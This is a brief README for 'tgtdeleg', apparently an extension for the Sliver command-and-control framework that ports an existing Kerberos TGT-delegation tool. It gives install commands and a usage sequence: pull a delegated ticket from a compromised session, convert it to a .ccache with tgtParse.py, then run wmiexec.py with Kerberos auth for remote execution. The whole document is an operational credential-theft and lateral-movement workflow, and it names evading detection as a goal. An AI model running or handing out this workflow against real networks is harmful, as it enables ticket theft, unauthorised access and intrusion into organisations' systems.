# tgtdeleg
https://github.com/connormcgarr/tgtdelegation for use with `sliver`

all credit to @connormcgarr

meant for living-above-the-land while avoiding `execute-assembly` as much as possible.


#### install
install with `extensions load <folder>`&`extensions install <folder>`


#### use
```
sliver (SESSION)> tgtdeleg 0 currentdomain default
# in a separate console
python3 install -r tgtParse/requirements.txt
python3 tgtParse/tgtParse.py --apreq <asreq> --sessionkey <key> --etype AES-256

# converts to .ccache automatically
export KRB5CCNAME=
python3 wmiexec.py -k ...
```
